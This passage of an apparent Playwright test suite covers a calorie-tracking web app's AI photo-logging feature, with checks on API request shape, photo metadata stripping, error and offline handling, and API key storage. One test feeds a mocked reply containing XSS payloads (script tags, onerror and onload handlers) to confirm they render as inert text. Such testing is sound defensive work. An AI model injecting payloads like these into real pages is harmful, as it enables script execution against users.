    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.photo-item');
    eq(calls.length, 1);
    const c = calls[0];
    eq(c.url, API);
    eq(c.headers['x-api-key'], KEY);
    eq(c.headers['anthropic-version'], '2023-06-01');
    eq(c.headers['anthropic-dangerous-direct-browser-access'], 'true');
    ok(!c.url.includes(KEY.slice(8)) && !c.raw.includes(KEY.slice(8)), 'key leaked into url or body');
    eq(c.body.model, 'claude-opus-5-5');
    ok(!('tool_choice' in c.body) && !('temperature' in c.body), 'sent a parameter the model rejects');
    eq(c.body.output_config.format.type, 'json_schema');
    const [img, text] = c.body.messages[0].content;
    eq(img.source.media_type, 'image/jpeg');
    const jpg = Buffer.from(img.source.data, 'base64');
    const dim = jpegSize(jpg);
    ok(dim && Math.max(dim.w, dim.h) === 1280, `long edge should be 1280, got ${JSON.stringify(dim)}`);
    ok(Math.abs(dim.w / dim.h - 1.5) < 0.01, 'aspect ratio changed');
    ok(jpg.length < big.size, 'not smaller than the original');
    ok((await readFile(big.file)).includes(secretNote), 'test setup: the original photo should carry the hidden marker');
    ok(!jpg.toString('latin1').includes(secretNote) && !jpg.toString('latin1').includes('Exif'), 'hidden photo data was not stripped');
    ok(/no sugar in the tea/.test(text.text), 'the note was not sent');
  });

  await check('results are listed with totals; editing a weight rescales it; an item can be removed', async () => {
    eq(await page.locator('.photo-item').count(), 3);
    const sheet = await page.locator('.sheet').innerText();
    ok(/Chicken and rice/.test(sheet) && /Marinade oil/.test(sheet) && /low confidence/.test(sheet));
    const total = async () => Number((await page.locator('.sheet .card.flat').first().innerText()).match(/(\d+) kcal/)[1]);
    eq(await total(), Math.round(54 * 4 + 7 * 9 + 6 * 4 + 68 * 4 + 1 * 9 + 10 * 4)); // 216+63+24+272+9+40 = 624
    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '90');
    eq(await total(), Math.round(624 - (27 * 4 + 3.5 * 9))); // half the chicken: 624 - 139.5 = 484.5
    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '');
    ok(/Enter an amount/.test(await page.locator('.photo-item').first().innerText()), 'empty weight not flagged');
    ok(await page.locator('[data-act="photo-add"]').isEnabled(), 'other items can still be added');
    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '90');
    await page.click('[data-act="photo-remove"][data-i="2"]');
    eq(await page.locator('.photo-item').count(), 2);
  });

  await check('"Add to" logs one flagged estimate per item and the day total moves', async () => {
    const before = await kcalEaten(page);
    await page.click('[data-act="photo-add"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const entries = (await lastEntries(page)).filter((e) => e.src === 'ai');
    eq(entries.length, 2);
    eq(entries[0].name, 'Grilled chicken breast (~90 g)');
    eq(entries[1].name, 'Steamed jasmine rice (~240 g)');
    ok(entries.every((e) => e.est === true && e.foodId === null && e.slot === 'dinner'));
    eq(entries[0].p, 27);
    eq(entries[0].f, 3.5);
    eq(entries[1].c, 68);
    const gained = Math.round(27 * 4 + 3.5 * 9 + 6 * 4 + 68 * 4 + 9);
    ok(Math.abs((await kcalEaten(page)) - before - gained) <= 1, `ring moved by ${(await kcalEaten(page)) - before}, expected ${gained}`);
    ok((await page.locator('[data-key="meal-dinner"] .pill.warn').count()) >= 2, 'estimates are not marked in the log');
  });

  await check('a failed estimate keeps the photo and can be retried: bad key, busy server, no network, garbled reply', async () => {
    const script = [{ status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'API key is invalid.' } } }, { status: 529, body: { type: 'error', error: { type: 'overloaded_error', message: 'Overloaded' } } }, 'abort', reply('this is not json'), reply(MEAL)];
    let i = 0;
    await ctx.unroute(API);
    calls = await mockApi(ctx, () => script[i++]);
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    const expectError = async (re) => {
      await page.click('[data-act="photo-analyze"]');
      await page.waitForSelector('.sheet .banner.bad');
      ok(re.test(await page.locator('.sheet .banner.bad').innerText()), `expected ${re}, got: ${await page.locator('.sheet .banner.bad').innerText()}`);
      ok(await page.locator('img.photo-preview').isVisible(), 'photo was lost after an error');
    };
    await expectError(/not accepted/);
    ok(await page.locator('.sheet [data-act="ai-key-open"]').isVisible(), 'no way to fix the key from the error');
    await expectError(/busy/);
    await expectError(/Could not reach/);
    await expectError(/could not be read/);
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.photo-item');
    eq(calls.length, 5);
    await closeSheet(page);
  });

  await check('Cancel while waiting returns to the photo, and a late answer is ignored', async () => {
    await ctx.unroute(API);
    let release;
    const gate = new Promise((r) => (release = r));
    calls = await mockApi(ctx, async () => { await gate; return reply(MEAL); });
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.spinner');
    await page.click('[data-act="photo-cancel"]');
    await page.waitForSelector('[data-act="photo-analyze"]');
    release();
    await page.waitForTimeout(300);
    eq(await page.locator('.photo-item').count(), 0, 'a cancelled answer showed up anyway');
    await closeSheet(page);
  });

  await check('closing the sheet mid-request is harmless and nothing is logged', async () => {
    await ctx.unroute(API);
    let release;
    const gate = new Promise((r) => (release = r));
    const before = (await lastEntries(page)).length;
    calls = await mockApi(ctx, async () => { await gate; return reply(MEAL); });
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.spinner');
    await closeSheet(page);
    release();
    await page.waitForTimeout(300);
    eq((await lastEntries(page)).length, before);
    eq(await page.locator('.sheet').count(), 0);
  });

  await check('a photo with no food, and a refused request, give clear messages', async () => {
    await ctx.unroute(API);
    const script = [reply({ is_food: false, meal_name: '', items: [], notes: 'This is a photo of a cat.' }), reply(MEAL, { stop_reason: 'refusal' })];
    let i = 0;
    calls = await mockApi(ctx, () => script[i++]);
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.sheet .banner.info');
    ok(/could not find food/.test(await page.locator('.sheet').innerText()));
    eq(await page.locator('[data-act="photo-add"]').count(), 0);
    await page.click('[data-act="photo-again"]');
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.sheet .banner.bad');
    ok(/declined/.test(await page.locator('.sheet .banner.bad').innerText()));
    await closeSheet(page);
  });

  await check('a hostile reply is shown as text, capped, and cannot run anything', async () => {
    await ctx.unroute(API);
    const evil = { is_food: true, meal_name: '<img src=x onerror="window.__xss=1">', items: [{ name: '<script>window.__xss=2</script>' + 'Z'.repeat(300), grams: 99999999, protein_g: 1e12, carbs_g: -50, fat_g: 'a lot', alcohol_g: 0, confidence: 'certain', basis: '<b onclick="window.__xss=3">x</b>' }], notes: '<svg onload="window.__xss=4">' };
    calls = await mockApi(ctx, () => reply(evil));
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    await page.click('[data-act="photo-analyze"]');
    await page.waitForSelector('.photo-item');
    eq(await page.evaluate(() => window.__xss), undefined, 'injected markup ran');
    eq(await page.locator('.sheet img[onerror], .sheet svg[onload], .sheet script').count(), 0);
    const total = Number((await page.locator('.sheet .card.flat').first().innerText()).match(/(\d+) kcal/)[1]);
    ok(total <= 400 * 4 + 1, `absurd numbers were not capped (${total} kcal)`);
    const wide = await page.evaluate(() => { const b = document.querySelector('.sheet-body'); return b.scrollWidth - b.clientWidth; });
    ok(wide <= 1, `long text widened the sheet by ${wide}px`);
    await closeSheet(page);
  });

  await check('More shows the key masked; switching model changes the next request; Test key works and reports errors', async () => {
    await ctx.unroute(API);
    let mode = 'ok';
    calls = await mockApi(ctx, () => (mode === 'ok' ? reply('OK') : { status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'API key is invalid.' } } }));
    await page.click('[data-act="tab"][data-v="more"]');
    const card = page.locator('section.card:has(h2:text("AI photo logging"))');
    ok(/Ready/.test(await card.innerText()) && (await card.innerText()).includes('sk-ant-…TTTT') && !(await card.innerText()).includes(KEY), 'key not shown masked');
    await card.locator('[data-act="ai-model"][data-v="claude-sonnet-5-5"]').click();
    eq((await state(page)).prefs.aiModel, 'claude-sonnet-5-5');
    await card.locator('[data-act="ai-key-test"]').click();
    await card.locator('text=Your key works').waitFor();
    eq(calls.at(-1).body.model, 'claude-sonnet-5-5');
    ok(calls.at(-1).raw.length < 600 && !calls.at(-1).raw.includes('"image"'), 'the key test should be a tiny text request');
    mode = 'bad';
    await card.locator('[data-act="ai-key-test"]').click();
    await card.locator('text=not accepted').waitFor();
    await card.locator('[data-act="ai-model"][data-v="claude-opus-5-5"]').click();
  });

  await check('removing the key clears it and photo logging asks for setup again', async () => {
    const card = page.locator('section.card:has(h2:text("AI photo logging"))');
    await card.locator('[data-act="ai-key-remove"]').click();
    await page.click('[data-act="confirm-yes"]');
    await card.locator('text=Not set up').waitFor();
    eq(await storedKey(page), null);
    await page.click('[data-act="tab"][data-v="today"]');
    await openPhotoTab(page);
    ok(/One-time setup/.test(await page.locator('.sheet').innerText()));
    await closeSheet(page);
  });

  await check('"Delete all data" also removes the key', async () => {
    await page.evaluate((a) => localStorage.setItem(a[0], a[1]), [KEY_STORAGE, KEY]);
    await page.click('[data-act="tab"][data-v="more"]');
    await page.click('[data-act="reset-all"]');
    await page.click('[data-act="confirm-yes"]');
    await page.waitForSelector('[data-act="try-example"]');
    eq(await storedKey(page), null);
  });
  eq(page.errors.filter((e) => !/Failed to load resource|net::/.test(e)).length, 0, 'console errors: ' + page.errors.join('; '));
  await ctx.close();

  // The real setup: the service worker is active. It must leave calls to Anthropic alone.
  const sw = await newPage({ serviceWorkers: 'allow' });
  await check('with the service worker active, the photo flow still reaches the API (a portrait photo, too)', async () => {
    const p = sw.page;
    await p.goto(BASE);
    await p.evaluate(() => navigator.serviceWorker.ready);
    await p.reload();
    await p.waitForFunction(() => !!navigator.serviceWorker.controller);
    await p.click('[data-act="try-example"]');
    await p.waitForSelector('.tabbar');
    await p.evaluate((a) => localStorage.setItem(a[0], a[1]), [KEY_STORAGE, KEY]);
    const swCalls = await mockApi(sw.ctx, () => reply(MEAL));
    const portrait = await makeJpeg(p, 1500, 2400);
    await openPhotoTab(p, 'lunch');
    await p.setInputFiles('input[data-change="photo-file"]', portrait.file);
    await p.waitForSelector('img.photo-preview');
    await p.click('[data-act="photo-analyze"]');
    await p.waitForSelector('.photo-item');
    eq(swCalls.length, 1);
    const dim = jpegSize(Buffer.from(swCalls[0].body.messages[0].content[0].source.data, 'base64'));
    ok(dim.h === 1280 && Math.abs(dim.w / dim.h - 1500 / 2400) < 0.01, `portrait photo came out ${JSON.stringify(dim)}`);
    await p.click('[data-act="photo-add"]');
    await p.waitForFunction(() => !document.querySelector('.sheet'));
    ok((await state(p)).days[Object.keys((await state(p)).days)[0]].entries.filter((e) => e.slot === 'lunch' && e.src === 'ai').length === 3);
  });
  await check('offline: a clear message instead of a hang', async () => {
    const p = sw.page;
    await sw.ctx.unroute(API);
    await sw.ctx.setOffline(true);
    await openPhotoTab(p, 'dinner');
    await p.setInputFiles('input[data-change="photo-file"]', big.file);
    await p.waitForSelector('img.photo-preview');
    await p.click('[data-act="photo-analyze"]');
    await p.waitForSelector('.sheet .banner.bad');
    ok(/Could not reach/.test(await p.locator('.sheet .banner.bad').innerText()));
    await sw.ctx.setOffline(false);
  });
  await sw.ctx.close();
}

console.log('\nOffline & PWA');
{
  const { ctx, page } = await newPage({ serviceWorkers: 'allow' });
  await check('manifest and icons are served', async () => {
    const m = await (await ctx.request.get(BASE + 'manifest.webmanifest')).json();
    eq(m.display, 'standalone');
    for (const i of m.icons) eq((await ctx.request.get(BASE + i.src)).status(), 200, i.src);
  });
  await check('service worker caches everything, then the app runs with the SERVER SHUT DOWN', async () => {
    await page.goto(BASE);
    await page.waitForSelector('[data-act="try-example"]');
    // wait until the worker has installed, activated and taken control
    await page.evaluate(() => navigator.serviceWorker.ready);
    await page.reload();
    await page.waitForFunction(() => !!navigator.serviceWorker.controller);
    // Playwright's setOffline() does not cover requests made by the worker itself,
    // so really take the network away: stop the server and drop every connection.
    server.closeAllConnections();
    await new Promise((r) => server.close(r));
    let reachable = true;
    try {
      await fetch(BASE + 'index.html', { signal: AbortSignal.timeout(1500) });
    } catch {
      reachable = false;
    }
    ok(!reachable, 'test server is still reachable, so this test proves nothing');
    await page.reload();
    await page.waitForSelector('[data-act="try-example"]', { timeout: 8000 });
    await page.click('[data-act="try-example"]');
    await page.waitForSelector('.tabbar');
    await page.click('[data-key="meal-lunch"] [data-act="log-planned"]');
    await page.waitForSelector('[data-key="meal-lunch"] .pill.ok');
    eq(page.errors.filter((e) => !/Failed to load resource|net::/.test(e)).length, 0, page.errors.join('; '));
  });
  await ctx.close();
}

await browser.close();
try { server.close(); } catch { /* already closed */ }
console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) {
  console.log('Failed:\n  - ' + failures.join('\n  - '));
  process.exit(1);
}
